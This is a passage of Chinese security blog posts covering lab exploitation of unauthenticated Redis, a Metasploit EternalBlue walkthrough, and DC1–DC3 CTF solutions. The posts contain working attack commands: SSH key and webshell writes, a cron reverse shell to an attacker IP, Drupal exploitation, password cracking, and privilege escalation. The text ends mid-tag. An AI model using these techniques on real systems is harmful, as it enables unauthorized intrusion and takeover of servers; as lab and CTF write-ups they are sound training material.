      <url>2021/04/21/redis-de-jian-dan-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h1><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库</p><p>端口：6379</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><p>kali =&gt;192.168.60.134</p><p>cenos =&gt; 192.168.60.130</p></blockquote><h1 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h1><p>Redis默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上</p><pre class="line-numbers language-none"><code class="language-none">./redis-server 使用默认配置./redis-server ../redis.conf 使用自定义配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><table><thead><tr><th>未授权访问</th><th>bind</th><th>protected-mode</th><th>连接</th><th>执行命令</th></tr></thead><tbody><tr><td></td><td>127.0.0.1</td><td>yes</td><td>不能</td><td>不能</td></tr><tr><td>能</td><td>0.0.0.0</td><td>yes</td><td>能</td><td>能</td></tr><tr><td></td><td>不绑定</td><td>yes</td><td>能</td><td>不能</td></tr><tr><td>能</td><td>不绑定</td><td>no</td><td>能</td><td>能</td></tr></tbody></table><p>总结：造成未授权访问有两种情况：</p><ol><li>未开启登录验证，并且把IP绑定到0.0.0.0</li><li>未开启登录验证，没有设置绑定IP，<code>protected-mode</code>关闭</li></ol><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Redis有两种持久化的方式：<strong>快照（RDB文件）</strong>和追加式文件（AOF文件）</p><p><strong>RDB方式</strong>：备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</p><pre class="line-numbers language-none"><code class="language-none">config set dir aa 设置备份目录为xxconfig set dbfilename bb 设置备份文件名为xx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="一、写SSH-keygen"><a href="#一、写SSH-keygen" class="headerlink" title="一、写SSH-keygen"></a>一、写SSH-keygen</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>root账号启动redis服务</li><li>服务器开放SSH服务，允许密钥登录。</li></ol><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>kali上生成公私钥</p><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>未授权访问redis</p><pre class="line-numbers language-none"><code class="language-none">redis-cli -h 192.168.60.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>利用redis的数据备份功能修改备份目录为 /redis/.ssh/ 备份文件名为 authorized_keys</p><pre class="line-numbers language-none"><code class="language-none">config set dir /root/.sshconfig set dbfilename authorized_keyssave <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>写入key-value</p><pre class="line-numbers language-none"><code class="language-none">set a "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiqG0Pp2TFXOKg/AdFZv2mdDKizbL85GrbGUg6ZoEpjWnoB9JGRSkSCfz/LoB0kokZ+iPMXPSETxn+Hs5Y13V9jQ0n+O5mDrO+eUSKhkKTTZBjjweIuoCjLvHcwuIHC1T3+S+U895Ur8Ea6tETRNPlKylgO9McsQjNg88q4RFo+vSXaU1IMs8kcyJ26wVeB8tAU/9nEKsjQkip52ENqSIqR3qdEQWV0Eoc9XrXT4o78TKQfkCSUTFUFgOO+9NYUfnWkR5KtbHusyRfNOKlkauFsgoIzHBQBl2K0pU4LkeA5D6YTHZwYwqId0AewSwCNzxq6GAbEVzmIJ3KzhOkjZXs3/JNmweX3DVdyPaXf57IogVyxkWtSGbA2QtUbWL96o8QT1TIvODA2H6s6ktq88/jTfOSInlhURzkxNYXLjvwRi/918ze0f7ISICGlbtkWR0audGfZwjLeYfjI5INc9mPBUjybSQDuCFI2oVOFFBbWWwdB4ipB8pyYf9JrsOMRO0= root@kali\n"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ssh连接</p><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@192.168.60.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="二、写计划任务反弹shell"><a href="#二、写计划任务反弹shell" class="headerlink" title="二、写计划任务反弹shell"></a>二、写计划任务反弹shell</h2><blockquote><p>/var/spool/cron/目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。dbfilename设置为root为用root用户权限执行计划任务。</p><p>执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p></blockquote><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>redis是root用户启动</li></ol><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>设置数据库备份目录为linux计划任务目录</p><pre class="line-numbers language-none"><code class="language-none">config set dir /var/spool/cron/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置备份文件名为root，以root身份执行计划任务</p><pre class="line-numbers language-none"><code class="language-none">config set dbfilename root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将反弹shell写入b键值并同步保存</p><pre class="line-numbers language-none"><code class="language-none">set a "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.60.134/4444 0&gt;&amp;1\n\n"save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后等待一会儿就可以看到反弹的shell</p></li></ol><h2 id="三、写webshell"><a href="#三、写webshell" class="headerlink" title="三、写webshell"></a>三、写webshell</h2><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>已知web的绝对路径</li><li>具有读写权限</li></ol><h3 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li><p>设置数据库备份目录为linux计划任务目录</p><pre class="line-numbers language-none"><code class="language-none">config set dir /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>写入webshell并同步保存</p><pre class="line-numbers language-none"><code class="language-none">set c "\n\n\n&lt;?php @eval($_POST['rose']);?&gt;\n\n\n" config set dbfilename webshell.php save 同步保存操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="四、利用主从复制获取shell"><a href="#四、利用主从复制获取shell" class="headerlink" title="四、利用主从复制获取shell"></a>四、利用主从复制获取shell</h2><blockquote><p>Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。</p></blockquote><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p><p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>下载利用脚本</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommandcd RedisModules-ExecuteCommand/makegit clone https://github.com/Ridter/redis-rcepython redis-rce.py -r 192.168.1.154 -L 192.168.1.153 -f module.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考：<a href="https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648">https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648</a></p><p>详细分析：<a href="https://paper.seebug.org/975/#redis">https://paper.seebug.org/975/#redis</a></p><h2 id="五、lua-rce"><a href="#五、lua-rce" class="headerlink" title="五、lua rce"></a>五、lua rce</h2><p>高权限运行低版本redis的lua虚拟机，写文件失败时可以进行尝试。</p><p>参考：<a href="https://www.freebuf.com/articles/web/237263.html">https://www.freebuf.com/articles/web/237263.html</a></p><p> <a href="https://www.anquanke.com/post/id/151203/">https://www.anquanke.com/post/id/151203/</a></p><p>EXP: <a href="https://github.com/QAX-A-Team/redis_lua_exploit/">https://github.com/QAX-A-Team/redis_lua_exploit/</a></p><h2 id="六、反序列化rce"><a href="#六、反序列化rce" class="headerlink" title="六、反序列化rce"></a>六、反序列化rce</h2><p>当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。<br>序列化数据类型分辨:</p><pre class="line-numbers language-none"><code class="language-none">jackson：关注 json 对象是不是数组，第一个元素看起来像不像类名，例如["com.blue.bean.User",xxx]fastjson：关注有没有 @type 字段jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 java 包名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>redis 反序列化本质上不是 redis 的漏洞，而是使用 redis 的应用反序列化了 redis 的数据而引起的漏洞，redis 是一个缓存服务器，用于存储一些缓存对象，所以在很多场景下 redis 里存储的都是各种序列化后的对象数据。</p><p>参考：<a href="https://www.freebuf.com/articles/web/237263.html">https://www.freebuf.com/articles/web/237263.html</a></p><h3 id="脚本工具"><a href="#脚本工具" class="headerlink" title="脚本工具"></a>脚本工具</h3><p>利用<br><a href="https://github.com/00theway/redis_exp">https://github.com/00theway/redis_exp</a><br>检测<br><a href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ol><li>禁止一些高危命令</li><li>以低权限运行 Redis 服务</li><li>为 Redis 添加密码验证</li><li>禁止外网访问 Redis</li><li>修改默认端口</li><li>保证 authorized_keys 文件的安全</li><li>设置防火墙策略</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Windows下如何getshell？</p><ul><li>写入webshell，需要知道web路径</li><li>写入启动项，需要目标服务器重启</li><li>写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。</li></ul><p>实战在生产环境下用还是会有很多问题的</p><ol><li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li><li>Ubuntu，Debian写计划任务反弹无用</li><li>写/etc/passwd会覆盖原有/etc/passwd，不可能改了再改回来</li><li>生产环境下用<code>KEY *</code> 这样的命令直接炸</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648">https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648</a></li><li><a href="https://www.freebuf.com/articles/web/249238.html">https://www.freebuf.com/articles/web/249238.html</a></li><li><a href="https://www.freebuf.com/articles/web/237263.html">https://www.freebuf.com/articles/web/237263.html</a></li><li><a href="https://www.freebuf.com/vuls/148758.html">https://www.freebuf.com/vuls/148758.html</a></li><li><a href="https://paper.seebug.org/975/#redis">https://paper.seebug.org/975/#redis</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploit主机渗透</title>
      <link href="2021/04/21/metasploit-zhu-ji-shen-tou/"/>
      <url>2021/04/21/metasploit-zhu-ji-shen-tou/</url>
      
        <content type="html"><![CDATA[<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><blockquote><p>利用ms07-010漏洞，获得shell</p></blockquote><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117212321875.png"></p><h4 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h4><pre class="line-numbers language-none"><code class="language-none">search ms17-010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117212522793.png"></p><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/smb/ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117212610501.png"></p><h4 id="查看选项"><a href="#查看选项" class="headerlink" title="查看选项"></a>查看选项</h4><pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117212734019.png"></p><h4 id="设置参数"><a href="#设置参数" class="headerlink" title="设置参数"></a>设置参数</h4><pre class="line-numbers language-none"><code class="language-none">set lhost {ip_local}set rhost {ip_romote}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="运行模块"><a href="#运行模块" class="headerlink" title="运行模块"></a>运行模块</h4><pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117213123549.png"></p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><pre class="line-numbers language-none"><code class="language-none">help #查看Meterpreter帮助shell #远程命令行shellwebcam_stream #捕获摄像头流getuid #查看当前用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>详见<a href="https://github.com/Urinx/Books/blob/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97.pdf">MSF渗透测试指南PDF</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机系列</title>
      <link href="2021/04/16/dc/"/>
      <url>2021/04/16/dc/</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><ul><li>回顾了metasploit的一些用法</li><li>利用已知cms的exp来getshell</li><li>hashcat爆破用法</li><li>find提权</li></ul><h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><ul><li>cewl根据网页内容生成字典</li><li>wpscan结合cewl跑账号和密码</li><li>用metasploit的模块来ssh爆破</li><li>rbash-&gt;bash——–vim逃逸</li><li>git提权</li></ul><h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><ul><li>searchsploit的一些用法</li><li>在github上搜罗cms探测脚本</li><li>john爆破用法</li><li>页面模板里添加一句话木马</li><li>使用Python开启SimpleHTTPServer</li><li>公开的脚本提权</li></ul><h1 id="DC1-1"><a href="#DC1-1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none"># nat模式，先扫一下，探测下IP是多少nmap -sP 192.168.60.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210411102620332.png"></p><pre class="line-numbers language-none"><code class="language-none"># 探测详细信息nmap -A -T 5 192.168.60.133 -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><table><thead><tr><th>开放端口</th><th>利用方式</th></tr></thead><tbody><tr><td>22</td><td>ssh爆破</td></tr><tr><td>80</td><td>CMS-Drupal 7，利用已知EXP</td></tr></tbody></table><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411103032.png"></p><p>flag1</p><p>使用metasploit getshell。</p><pre class="line-numbers language-none"><code class="language-none"># msfconsle# search Drupal# use exploit/multi/http/drupal_drupageddon# set rhosts 192.168.60.133# set lhost 192.168.60.134# run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411103759.png"></p><p>ls查看下当前目录下的文件，发现flag1</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411103859.png"></p><pre class="line-numbers language-none"><code class="language-none"># cat flag1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p> good CMS needs a config file - and so do you.</p></blockquote><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示我们可以看看配置文件，网上找了下Drupal的配置文件目录。</p><p>可以这样搜索：</p><pre class="line-numbers language-none"><code class="language-none">find / -name setting*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在此之前我们先切换到bash，因为meterpreter貌似不能使用find命令。</p><pre class="line-numbers language-none"><code class="language-none"># shell# python -c "import pty;pty.spawn('/bin/bash')"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104334.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104404.png"></p><pre class="line-numbers language-none"><code class="language-none"># 查看配置文件cat /var/www/sites/default/settings.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104634.png"></p><p>发现数据库账号和密码</p><pre class="line-numbers language-none"><code class="language-none">username: dbuserpassword: R0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还发现了flag2</p><blockquote><p>Brute force and dictionary attacks aren’t the</p><p>only ways to gain access (and you WILL need access).</p><p>What can you do with these credentials?</p></blockquote><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>登陆下mysql</p><pre class="line-numbers language-none"><code class="language-none">mysql -udbuser -pR0ck3t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411104917.png"></p><p>查看数据库</p><pre class="line-numbers language-none"><code class="language-none">show databases;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105047.png"></p><pre class="line-numbers language-none"><code class="language-none"># use drupaldb;# show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105222.png"></p><p>有个users表，然后我们看下字段有哪些。</p><pre class="line-numbers language-none"><code class="language-none">desc users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105324.png"></p><pre class="line-numbers language-none"><code class="language-none">select name,pass from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>name</th><th>pass</th></tr></thead><tbody><tr><td>admin</td><td>$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</td></tr><tr><td>Fred</td><td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td></tr></tbody></table><p>接下来我们，使用kali的一款工具，hashcat来爆破下改密码。</p><p>先使用hashcat查看drupal的mode。</p><pre class="line-numbers language-none"><code class="language-none">hashcat --help | grep "Drupal"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411105916.png"></p><p>然后我们还需要将上面两端hash写到一个文件source.txt里面。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411110205.png"></p><p>还需要一个密码字典。</p><p><a href="https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Auth/password/Top100_pass1.txt">https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Auth/password/Top100_pass1.txt</a></p><p>然后就可以开跑了</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 7900 -a 0 source.txt pass01.txt-m 指定要破解的 hash 类型，如果不指定类型，则默认是 MD5-a 指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。source.txt 你要爆破的 hash 列表pass01.txt 你的密码表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到明文密码</p><table><thead><tr><th>name</th><th>password</th></tr></thead><tbody><tr><td>admin</td><td>53cr3t</td></tr><tr><td>Fred</td><td>MyPassword</td></tr></tbody></table><p>之后直接用浏览器访问该地址，然后用admin账户登录上去就可以看到flag3了</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411111244.png"></p><blockquote><p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p></blockquote><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>接着根据提示查看passwd</p><pre class="line-numbers language-none"><code class="language-none">cat /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411111429.png"></p><p>我们去家目录/home/flag4，发现有个flag4.txt</p><pre class="line-numbers language-none"><code class="language-none">cat /home/flag4/fla4.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Can you use this same method to find or access the flag in root?</p><p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p></blockquote><h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>flag提示我们要提权到root</p><p>试试find提权</p><pre class="line-numbers language-none"><code class="language-none">find . -exec /bin/sh \; -quitorfind .-exec /bin/bash -p \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>提权之后就得找一下了，因为最后一个flag的名字不是flag5，不能使用find去找，我们可以进入root目录下看看，果然发现了thefinalflag.txt</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411112128.png"></p><p>final-flag</p><blockquote><p>done!!!!</p><p>Hopefully you’ve enjoyed this and learned some new skills.</p><p>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p></blockquote><h1 id="DC2-1"><a href="#DC2-1" class="headerlink" title="DC2"></a>DC2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre class="line-numbers language-none"><code class="language-none">nmap -sP 192.168.60.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>排除宿主机、网关、kali就剩下一个192.168.60.135</p><p>然后再扫一下具体信息</p><pre class="line-numbers language-none"><code class="language-none">nmap -A -T 5 192.168.60.135 -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412211513.png"></p><table><thead><tr><th>端口</th><th>利用</th></tr></thead><tbody><tr><td>80 wordpress4.7.10</td><td>wpscan</td></tr><tr><td>7744 ssh</td><td>ssh爆破</td></tr></tbody></table><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>直接根据靶机的描述将攻击机kali /etc/hosts文件添加一行</p><pre class="line-numbers language-none"><code class="language-none">192.168.60.135 dc-2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问<a href="http://dc-2/">http://dc-2/</a> 就能解析到该靶机的80端口，然后就得到了flag1</p><blockquote><p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p><p>More passwords is always better, but sometimes you just can’t win them all.</p><p>Log in as one to see the next flag.</p><p>If you can’t find it, log in as another.</p></blockquote><h2 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h2><p>先扫描先wordpress</p><pre class="line-numbers language-none"><code class="language-none">#扫描主题漏洞wpscan --url http://dc-2/ -e vt --api-token [token]#扫描插件漏洞wpscan --url http://dc-2/ -e vp --api-token [token]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>api-token需要去<a href="https://wpvulndb.com/users/sign_up">官网</a>注册然后再登陆就能看到了（需要翻墙）</p><p>没有发现什么漏洞，所以我们试一试爆破下ssh的7744端口</p><p>根据flag1提示，我们需要使用一个工具叫cewl生成一个字典</p><pre class="line-numbers language-none"><code class="language-none">cewl http://dc-2/ -w 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跑一下用户和密码</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url http://dc-2 --enumerate uwpscan --url http://dc-2 --passwords ~/dc2/1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412220020.png"></p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>Jerry</td><td>adipiscing</td></tr><tr><td>tom</td><td>parturient</td></tr></tbody></table><p>得使用账号 jerry 登录后可以发现 flag2</p><blockquote><p>If you can’t exploit WordPress and take a shortcut, there is another way.</p><p>Hope you found another entry point.</p></blockquote><h2 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h2><p>使用metasploit跑一下，使用cewl生成的字典</p><pre class="line-numbers language-none"><code class="language-none">msfconsolesearch ssh_loginuse auxiliary/scanner/ssh/ssh_loginshow optionsset RHOSTS 192.168.60.135set rport 7744set PASS_FILE ~/dc2/1.txtset username tomrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出来了一个</p><table><thead><tr><th>Username</th><th>Password</th></tr></thead><tbody><tr><td>tom</td><td>parturient</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">ssh tom@192.168.60.135 -p 7744<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412220826.png"></p><p>可以看到这是一个rbash（受限制的bash），所以无法使用一些常见的命令，</p><pre class="line-numbers language-none"><code class="language-none">compgen -c 查看可用命令less flag3.txt 用less来查看文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>flag3</p><blockquote><p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p></blockquote><h2 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h2><pre class="line-numbers language-none"><code class="language-none">less /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412221442.png"></p><p>查阅资料得使用 vi 进行逃逸</p><pre class="line-numbers language-none"><code class="language-none">vi:set shell=/bin/sh:shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>听说更改环境变量,把 <code>/bin/sh</code> 目录加进去,许多命令才好用</p><pre class="line-numbers language-none"><code class="language-none">echo $PATHexport PATH=$PATH:/bin:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">su jerry输入密码 adipiscing<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210412222015.png"></p><p>进入jerry的家目录，发现</p><p>flag4</p><blockquote><p>Good to see that you’ve made it this far - but you’re not home yet. </p><p>You still need to get the final flag (the only flag that really counts!!!).  </p><p>No hints here - you’re on your own now.  :-)</p><p>Go on - git outta here!!!!</p></blockquote><h2 id="thefinalflag-1"><a href="#thefinalflag-1" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>flag4提示用git提权</p><pre class="line-numbers language-none"><code class="language-none">sudo git -p help config!/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>切换到家目录然后再cat</p><p> final-flag</p><blockquote><p>Congratulatons!!!</p><p>A special thanks to all those who sent me tweets<br>and provided me with feedback - it’s all greatly<br>appreciated.</p><p>If you enjoyed this CTF, send me a tweet via @DCAU7.</p></blockquote><h1 id="DC3-1"><a href="#DC3-1" class="headerlink" title="DC3"></a>DC3</h1><pre class="line-numbers language-none"><code class="language-none">nmap -sP -T 5 192.168.60.1/24nmap -A -T 5 192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210413195028.png"></p><p>是个名为joomla的内容管理系统，扫下后台</p><blockquote><p><a href="http://192.168.60.136/administrator/index.php">http://192.168.60.136/administrator/index.php</a></p></blockquote><p>无法登陆，先不爆破，去github上看看有没有探测joomla的脚本</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/OWASP/joomscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>clone下来，然后</p><pre class="line-numbers language-none"><code class="language-none">perl joomscan.pl -u http://192.168.60.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 